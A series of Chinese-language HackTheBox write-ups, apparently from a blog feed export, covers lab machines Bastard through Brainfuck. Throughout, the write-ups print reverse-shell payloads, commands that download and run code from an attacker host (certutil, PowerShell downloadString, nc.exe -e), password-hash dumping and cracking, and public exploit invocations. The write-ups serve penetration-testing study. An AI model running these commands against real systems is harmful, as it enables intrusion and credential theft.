<p>所以你可以执行reverse_powershell指令获取powershell</p>
<p><img src="/images/Bastard/23.jpg" alt="23"></p>
<p>或者利用文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;10.10.16.123 LPORT&#x3D;4444 -f exe -o evil.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;10.10.10.9&#x2F; -c &quot;certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.16.123&#x2F;evil.exe %temp%&#x2F;evil.exe&quot;</span><br><span class="line">python drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;10.10.10.9&#x2F; -c &quot;C:\Windows\TEMP\evil.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/24.jpg" alt="24"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.123&#x2F;winpriv&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/25.jpg" alt="25"></p>
<p>利用MS15-051提权</p>
<p><img src="/images/Bastard/26.jpg" alt="26"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bastion</title>
    <url>/2021/05/07/HTB-Bastion/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Bastion/1.png" alt="1"></p>
<p>没有HTTP服务，从SMB下手</p>
<p><img src="/images/Bastion/2.png" alt="2"></p>
<p>发现名为Backups的文件夹，里面有VHD文件</p>
<p><img src="/images/Bastion/3.png" alt="3"></p>
<p>之后还能发现一个提示文件</p>
<p><img src="/images/Bastion/4.png" alt="4"></p>
<p>所以应该是要看VHD备份文件里有什么，但是这个文件太大了，下载很费事</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="Linux下操作"><a href="#Linux下操作" class="headerlink" title="Linux下操作"></a>Linux下操作</h2><p>首先挂载SMB到本地</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount &quot;&#x2F;&#x2F;10.10.10.134&#x2F;Backups&#x2F;WindowsImageBackup&#x2F;L4mpje-PC&#x2F;Backup 2019-02-22 124351&quot; &#x2F;tmp&#x2F;SMB -o username&#x3D;&quot;guest&quot;,password&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>之后就是想办法把VHD挂载到kali上，可以参考<a href="https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25">链接</a></p>
<p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install libguestfs-tools</span><br></pre></td></tr></table></figure>

<p>挂载，这需要一些时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">guestmount --add &#x2F;tmp&#x2F;SMB&#x2F;9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro &#x2F;tmp&#x2F;vhdshare -v</span><br></pre></td></tr></table></figure>

<p>顺利挂载</p>
<p><img src="/images/Bastion/5.png" alt="5"></p>
<p>之后提取<code>Windows/System32/config</code>下的SAM和SYSTEM</p>
<p><img src="/images/Bastion/6.png" alt="6"></p>
<p>尝试导出NTLM hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">samdump2 SYSTEM SAM</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastion/7.png" alt="7"></p>
<p>破解即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;26112010952d963c8dc4217daec986d9&#39; &gt; hash</span><br><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --format&#x3D;nt</span><br></pre></td></tr></table></figure>

<p>得到凭据<code>L4mpje/bureaulampje</code>，SSH过去即可</p>
<h2 id="Windows下操作"><a href="#Windows下操作" class="headerlink" title="Windows下操作"></a>Windows下操作</h2><p>直接压缩包就可以打开，节省了挂载</p>
<p><img src="/images/Bastion/9.png" alt="9"></p>
<p>直接复制出来直接mimikatz即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam &#x2F;sam:sam &#x2F;system:system</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastion/10.png" alt="10"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>找到了一个mRemoteNG的应用程序</p>
<p><img src="/images/Bastion/11.png" alt="11"></p>
<p>这有趣，因为模拟了真实的堡垒机环境，工作人员通过堡垒机来登陆到办公室的网络。</p>
<p>搜索它的漏洞，可以发现一些和密码相关的exploit</p>
<p><img src="/images/Bastion/12.png" alt="12"></p>
<p>找到了一篇关于不安全的密码存储相关的文章:<a href="https://hackersvanguard.com/mremoteng-insecure-password-storage/">链接</a></p>
<p>通过scp下载加密后的密码文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp L4mpje@10.10.10.134:&quot;C:&#x2F;Users&#x2F;L4mpje&#x2F;AppData&#x2F;Roaming&#x2F;mRemoteNG&#x2F;confCons.xml&quot; &#x2F;root&#x2F;Desktop&#x2F;confCons.xml</span><br></pre></td></tr></table></figure>

<p>顺着步骤来，就可以得到密码了<code>thXLHM96BeKL0ER2</code></p>
<p><img src="/images/Bastion/13.png" alt="13"></p>
<p>administrator SSH过去即可</p>
<p><img src="/images/Bastion/14.png" alt="14"></p>
<p>另外有一个python脚本可以快速完成这一步骤，<a href="https://github.com/haseebT/mRemoteNG-Decrypt">链接</a></p>
<p><img src="/images/Bastion/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Beep</title>
    <url>/2020/06/11/HTB-Beep/</url>
    <content><![CDATA[<h1 id="Beep"><a href="#Beep" class="headerlink" title="Beep"></a>Beep</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Beep/1.jpg" alt="1"></p>
<p>扫出了很多端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Beep/2.jpg" alt="2"></p>
<p>web服务:elastix</p>
<p><img src="/images/Beep/3.jpg" alt="3"></p>
<p>之后对目录进行扫描</p>
<p><img src="/images/Beep/4.jpg" alt="4"></p>
<p>还发现了FreePBX</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1-文件包含"><a href="#方法1-文件包含" class="headerlink" title="方法1:文件包含"></a>方法1:文件包含</h3><p>searchsploit</p>
<p> <img src="/images/Beep/6.jpg" alt="6"></p>
<p>37637.pl</p>
<p><img src="/images/Beep/5.jpg" alt="5"></p>
<p><img src="/images/Beep/7.jpg" alt="7"></p>
<p>发现文件包含成功了，现在读取的<code>/etc/amportal.conf</code> 是FreePBX的配置文件</p>
<p><img src="/images/Beep/8.jpg" alt="8"></p>
<p>我们还可以读取一下<code>/etc/asterisk/manager.conf</code>，这是FreePBX连接asterisk的管理密码</p>
<p><img src="/images/Beep/9.jpg" alt="9"></p>
<p>最后再读取一下/etc/passwd</p>
<p><img src="/images/Beep/10.jpg" alt="10"></p>
<p>获取拥有bash的用户，最后排列组合用户名和获取的密码尝试</p>
<p>期间ssh还遇到了不支持sha1的问题，需要手动开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;ssh_config												&#x2F;&#x2F;不需要重启</span><br><span class="line">MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160			&#x2F;&#x2F;删掉注释</span><br><span class="line">HostkeyAlgorithms ssh-dss,ssh-rsa									&#x2F;&#x2F;末尾添加</span><br><span class="line">KexAlgorithms +diffie-hellman-group1-sha1							&#x2F;&#x2F;末尾添加</span><br></pre></td></tr></table></figure>

<p>最后使用账号/密码<code>root/jEhdIekWmdjE</code>，成功登录，还是root权限</p>
<p><img src="/images/Beep/11.jpg" alt="11"></p>
<h3 id="方法2-RCE"><a href="#方法2-RCE" class="headerlink" title="方法2:RCE"></a>方法2:RCE</h3><p><img src="/images/Beep/12.jpg" alt="12"></p>
<p>Elastix存在RCE漏洞，不过直接运行18650.py会出现SSL证书错误</p>
<p>可以利用burp强制tls转发</p>
<p><img src="/images/Beep/13.jpg" alt="13"></p>
<p>接着使用svwar扫描SIP线路</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install sipvicious</span><br></pre></td></tr></table></figure>

<p><img src="/images/Beep/15.jpg" alt="15"></p>
<p>修改EXP</p>
<p><img src="/images/Beep/14.jpg" alt="14"></p>
<p>之后就可以获取shell</p>
<p><img src="/images/Beep/16.jpg" alt="16"></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="/images/Beep/17.jpg" alt="17"></p>
<p>利用nmap提权</p>
<p><img src="/images/Beep/18.jpg" alt="18"></p>
<h3 id="方法3-msf"><a href="#方法3-msf" class="headerlink" title="方法3:msf"></a>方法3:msf</h3><p>使用字典<code>directory-list-2.3-medium.txt</code>发现目录<code>vtigercrm</code>版本5.1.0</p>
<p><img src="/images/Beep/19.jpg" alt="19"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload</span><br><span class="line">set RHOSTS 10.10.10.7</span><br><span class="line">set SSL true</span><br><span class="line">set RPORT 443</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST tun0</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>

<p>如果遇到SSL错误，是因为openssl版本太高不支持低版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OpenSSL::SSL::SSLError SSL_connect returned&#x3D;1 errno&#x3D;0 state&#x3D;error: dh key too small</span><br></pre></td></tr></table></figure>

<p>可以修改/etc/ssl/openssl.cnf，或者像之前一样，用burp转发解决</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[system_default_sect]</span><br><span class="line">MinProtocol = TLSv1<span class="number">.2</span></span><br><span class="line">CipherString = DEFAULT@SECLEVEL=<span class="number">2</span></span><br><span class="line"><span class="comment">//修改</span></span><br><span class="line">[system_default_sect]</span><br><span class="line">MinProtocol = None</span><br><span class="line">CipherString = DEFAULT</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Blocky</title>
    <url>/2020/10/22/HTB-Blocky/</url>
    <content><![CDATA[<h1 id="Blocky"><a href="#Blocky" class="headerlink" title="Blocky"></a>Blocky</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blocky/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>首先检查21端口，它存在一个文件复制(需要登录)、RCE漏洞(需要写webshell)，都无法利用，直接放弃</p>
<p>80端口发现wordpress</p>
<p>目录枚举</p>
<p><img src="/images/Blocky/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>对wordpress枚举</p>
<p>用户名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;10.10.10.37&#x2F; --disable-tls-checks --enumerate u</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blocky/2.png" alt="2"></p>
<p>插件枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;10.10.10.37&#x2F; --disable-tls-checks --enumerate ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blocky/3.png" alt="3"></p>
<p>查看之前发现的<code>plugins</code>目录，发现了一些东西(这个URL具有迷惑性，它并不是<code>/wp-content/plugins</code>)</p>
<p><img src="/images/Blocky/5.png" alt="5"></p>
<p>得到两个jar文件，解压它们</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar -xvf filename</span><br></pre></td></tr></table></figure>

<p>之后会发现一个文件<code>BlockyCore.class</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file BlockyCore.class </span><br><span class="line">BlockyCore.class: compiled Java class data, version 52.0 (Java 1.8)</span><br></pre></td></tr></table></figure>

<p>使用jad反编译它(下载地址:<a href="http://varaneckas.com/jad/jad158e.linux.static.zip">http://varaneckas.com/jad/jad158e.linux.static.zip</a>)</p>
<p><img src="/images/Blocky/6.png" alt="6"></p>
<p>获取凭据<code>8YsqfCTnvxAUeduzjNSXe22</code></p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>密码复用，一键提权</p>
<p><img src="/images/Blocky/7.png" alt="7"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>使用sql连接凭据登录到phpmyadmin</p>
<p><img src="/images/Blocky/8.png" alt="8"></p>
<p>不需要破解，通过password_hash()，创建一个已知的MD5hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; echo password_hash(&quot;evil&quot;, PASSWORD_DEFAULT);</span><br><span class="line">$2y$10$jdC4&#x2F;HEq5F9l9ISP8r3bA.sFgSGJm0APB1JkND&#x2F;z.6563dqMOo.TK</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blocky/9.png" alt="9"></p>
<p>使用它们登录进wordpress后台，进行getshell</p>
<p><img src="/images/Blocky/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核版本信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4.4.0-62-generic</span><br><span class="line">Ubuntu 16.04.2 LTS</span><br></pre></td></tr></table></figure>

<p>找到漏洞</p>
<p><img src="/images/Blocky/11.png" alt="11"></p>
<p>传输过去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc 41458.c -o pwn</span><br><span class="line">scp pwn notch@10.10.10.37:</span><br><span class="line">8YsqfCTnvxAUeduzjNSXe22</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blocky/12.png" alt="12"></p>
<p>非常不稳定，系统会立即崩溃</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Blue</title>
    <url>/2020/06/05/HTB-Blue/</url>
    <content><![CDATA[<h1 id="Blue"><a href="#Blue" class="headerlink" title="Blue"></a>Blue</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blue/1.jpg" alt="1"></p>
<p>扫描之后发现了smb服务，并且机器为windows7</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>竟然是win7，就会想到EternalBlue</p>
<p><img src="/images/Blue/2.jpg" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>github</p>
<p><a href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a></p>
<p>github</p>
<p><a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></p>
<p>zzz_exploit.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;&lt;LAB IP&gt; lport&#x3D;&lt;PORT&gt; -f exe &gt; writeup.exe</span><br></pre></td></tr></table></figure>

<p>修改exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb_send_file(smbConn, &#39;&#x2F;root&#x2F;Desktop&#x2F;writeups&#x2F;blue&#x2F;writeup.exe&#39;, &#39;C&#39;, &#39;&#x2F;writeup.exe&#39;)</span><br><span class="line">service_exec(conn, r&#39;cmd &#x2F;c c:\\writeup.exe&#39;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz_exploit.py 10.10.10.40</span><br></pre></td></tr></table></figure>

<p>msf</p>
<p>windows/smb/ms17_010_eternalblue</p>
<p><img src="/images/Blue/3.jpg" alt="3"></p>
<p>这个漏洞在利用过程中很不稳定，不断尝试总有几次能成功</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Blunder</title>
    <url>/2020/09/24/HTB-Blunder/</url>
    <content><![CDATA[<h1 id="Blunder"><a href="#Blunder" class="headerlink" title="Blunder"></a>Blunder</h1><p>kali:10.10.16.10<br>目标:10.10.10.191</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blunder/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动查看80，看样子是一个博客，页面上没有什么有用的链接，手动检查robots.txt，但没有什么有效的发现<br>目录枚举，打开php扩展</p>
<p><img src="/images/Blunder/2.png" alt="2"></p>
<p>从admin文件夹中发现了CMS BLUDIT</p>
<p><img src="/images/Blunder/3.png" alt="3"></p>
<p>接着检查源代码</p>
<p><img src="/images/Blunder/4.png" alt="4"></p>
<p>发现了具体版本为3.9.2，登录页面存在csrftoken</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接搜索公开漏洞</p>
<p><img src="/images/Blunder/5.png" alt="5"></p>
<p>第一个是暴力破解，不考虑，第二个目录遍历看起来有点意思<br>打开查看给出了具体的操作步骤，还给出了漏洞编号(CVE-2019-16113)，看样子是一个文件上传漏洞，需要登录凭据<br>先谷歌一下发现了可以用的python脚本，直接输入RCE指令即可，看起来使用起来很方便</p>
<p><a href="https://github.com/cybervaca/CVE-2019-16113">https://github.com/cybervaca/CVE-2019-16113</a></p>
<p>现在考虑凭据下手，由于csrftoken的存在，我们只能单线程爆破，所以<strong>think simple</strong>，看来枚举工作没做到位，我又再次枚举了txt</p>
<p><img src="/images/Blunder/6.png" alt="6"></p>
<p>看起来发现了一个用户名<code>fergus</code>，接着考虑密码字典<br>既然这是一个博客，那首页的文章还是给出了比较多的信息，考虑使用cewl，暂时不考虑变异字典</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl -m 4 -d 5 -w wordlist.txt http:&#x2F;&#x2F;10.10.10.191&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blunder/7.png" alt="7"></p>
<p>字典的大小在可接受程度</p>
<p>之后的csrftoken爆破就很轻松了，使用burp的macro进行操作</p>
<p><img src="/images/Blunder/8.png" alt="8"></p>
<p>选择了正确的用户名，使我们能很快得到需要的信息<code>RolandDeschain</code></p>
<p>执行该脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 CVE-2019-16113.py -u http:&#x2F;&#x2F;10.10.10.191 -user fergus -pass RolandDeschain -c &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.10&#x2F;443 0&gt;&amp;1&#39;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blunder/9.png" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先枚举用户，发现普通用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hugo</span><br><span class="line">shaun</span><br><span class="line">temp</span><br></pre></td></tr></table></figure>

<p>这里没有发现mysql，去web目录下寻找其他登录凭据，发现了两个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;bludit-3.10.0a&#x2F;bl-content&#x2F;databases&#x2F;users.php</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;bludit-3.9.2&#x2F;bl-content&#x2F;databases&#x2F;users.php</span><br></pre></td></tr></table></figure>

<p>其中3.10.0a中的用户名匹配已知普通用户名</p>
<p><img src="/images/Blunder/10.png" alt="10"></p>
<p>破解密码</p>
<p><img src="/images/Blunder/11.png" alt="11"></p>
<p>切换到hugo，枚举sudo权限</p>
<p><img src="/images/Blunder/12.png" alt="12"></p>
<p>发现了奇怪的sudo权限<code>(ALL, !root) /bin/bash</code>，这表示我们可以轻易切换任何用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u shaun &#x2F;bin&#x2F;bash -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/Blunder/13.png" alt="13"></p>
<p>这里我真是佛了，我直接跳进了这个思路里，四下寻找，之后我才google这个不寻常的sudo权限，发现了</p>
<p><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p>
<p><img src="/images/Blunder/14.png" alt="14"></p>
<p>并且作者给出了非常好的解释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description :</span><br><span class="line">Sudo doesn&#39;t check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv</span><br><span class="line">-u#-1 returns as 0 which is root&#39;s id</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bounty</title>
    <url>/2020/06/22/HTB-Bounty/</url>
    <content><![CDATA[<h1 id="Bounty"><a href="#Bounty" class="headerlink" title="Bounty"></a>Bounty</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bounty/1.jpg" alt="1"></p>
<p>只发现了80端口，且IIS版本为7.5</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问http首页，没有有价值的信息<br>进行目录枚举，对IIS还要扫描asp和aspx页面</p>
<p><img src="/images/Bounty/2.jpg" alt="2"></p>
<p>发现了一处文件上传</p>
<p><img src="/images/Bounty/3.jpg" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>尝试上传文件</p>
<p>先正常上传一张图片，看看能否访问</p>
<p><img src="/images/Bounty/4.jpg" alt="4"></p>
<p>提示上传成功</p>
<p><img src="/images/Bounty/5.jpg" alt="5"></p>
<p>并且在uploadedfiles目录下可以访问<br>确认上传文件可以被访问，就可以尝试上传恶意脚本</p>
<p>尝试修改文件名和Content-Type观察上传机制</p>
<p><img src="/images/Bounty/6.jpg" alt="6"></p>
<p>发现.config是可以成功上传的，尝试searchsploit搜索相关漏洞，可惜一无所获<br>谷歌搜索关键词IIS 7.5 upload exloit config，找到了exp，<a href="https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/">链接</a><br>这个漏洞允许你上传文件名为<code>web.config</code>包含自定义asp代码，从而达到RCE</p>
<p>修改一下payload，原来payload<code>whoami</code>无法运行<br>需要修改为<code>cmd /c whoami</code></p>
<p><img src="/images/Bounty/8.jpg" alt="8"></p>
<p><img src="/images/Bounty/7.jpg" alt="7"></p>
<p>RCE成功，现在只要修改成获取shell的命令即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c cd %tmp% &amp;&amp; copy \\10.10.16.150\a\nc.exe &amp;&amp; nc.exe -nv 10.10.16.150 4444 -e cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bounty/9.jpg" alt="9"></p>
<p>成功获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="MS15-051"><a href="#MS15-051" class="headerlink" title="MS15-051"></a>MS15-051</h3><p><img src="/images/Bounty/10.jpg" alt="10"></p>
<p><img src="/images/Bounty/11.jpg" alt="11"></p>
<p>提权成功</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Brainfuck</title>
    <url>/2020/06/05/HTB-Brainfuck/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/brainfuck/1.jpg" alt="1"></p>
<p>发现443端口运行了https服务，登录之后是一个nginx的欢迎页面<br>在/etc/hosts中添加ip</p>
<p><img src="/images/brainfuck/2.jpg" alt="2"></p>
<p>之后就可以正常访问了</p>
<p><img src="/images/brainfuck/3.jpg" alt="3"></p>
<p>这是一个wordpress站点，可以进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token zBDf1JO6FsSNPZjosgaoPHKg8f049ar0FhEFDumlGjg --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; --disable-tls-checks</span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/4.jpg" alt="4"></p>
<p>发现了wp support plus存在的漏洞</p>
<p>接着对wordpress进行用户名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; --disable-tls-checks --enumerate u</span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/5.jpg" alt="5"></p>
<p>发现了2个账号</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p><img src="/images/brainfuck/6.jpg" alt="6"></p>
<p><img src="/images/brainfuck/7.jpg" alt="7"></p>
<p>这个权限提升漏洞可以让你不知道秘密的情况下进行 登录，不过需要知道用户名</p>
<p>我们在本地web服务创建HTML页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;https:&#x2F;&#x2F;brainfuck.htb&#x2F;wp-admin&#x2F;admin-ajax.php&quot;&gt;</span><br><span class="line">        Username: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;administrator&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;email&quot; value&#x3D;&quot;sth&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;loginGuestFacebook&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/8.jpg" alt="8"></p>
<p>等待一会儿</p>
<p><img src="/images/brainfuck/9.jpg" alt="9"></p>
<p>这时候再回到主页</p>
<p><img src="/images/brainfuck/10.jpg" alt="10"></p>
<p>发现我们已经获得了cookie成功登录了账号</p>
<p>两个账号都没有对插件的写权限，不能写入shell，不过在admin账号下，发现了</p>
<p><img src="/images/brainfuck/11.jpg" alt="11"></p>
<p>SMTP账号密码orestis/kHGuERB29DNiNE</p>
<p>之后我就可以利用获取的账号和密码访问pop3服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#nc -nv 10.10.10.17 110</span><br><span class="line">USER orestis</span><br><span class="line">PASS kHGuERB29DNiNE</span><br><span class="line">stat</span><br><span class="line">retr1</span><br><span class="line">retr2</span><br></pre></td></tr></table></figure>

<p><img src="/images/brainfuck/12.jpg" alt="12"></p>
<p>在第二封邮件里发现了账号和密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username: orestis</span><br><span class="line">password: kIEnnfEKJ#9UmdO</span><br></pre></td></tr></table></figure>

<p>使用这个密码可以登录<code>https://sup3rs3cr3t.brainfuck.htb/</code></p>
<p><img src="/images/brainfuck/13.jpg" alt="13"></p>
<p>在其中一个会话中发现了加密通讯信息</p>
<p><img src="/images/brainfuck/16.png" alt="16"></p>
<p>这里破解需要另一个论坛上的信息</p>
<p><img src="/images/brainfuck/17.png" alt="17"></p>
<p>可以猜到签名部分应该是相同的内容，但这里显示的字符串并不相同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Pieagnm - Jkoijeg nbw zwx mle grwsnn</span><br><span class="line">Wejmvse - Fbtkqal zqb rso rnl cwihsf</span><br><span class="line">Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</span><br><span class="line">Orestis - Hacking for fun and profit</span><br></pre></td></tr></table></figure>

<p>我们可以猜测它使用了维吉尼亚密码，然后此<a href="http://rumkin.com/tools/cipher/otp.php">链接</a>可以快速计算出密钥<code>fuckmybrain</code></p>
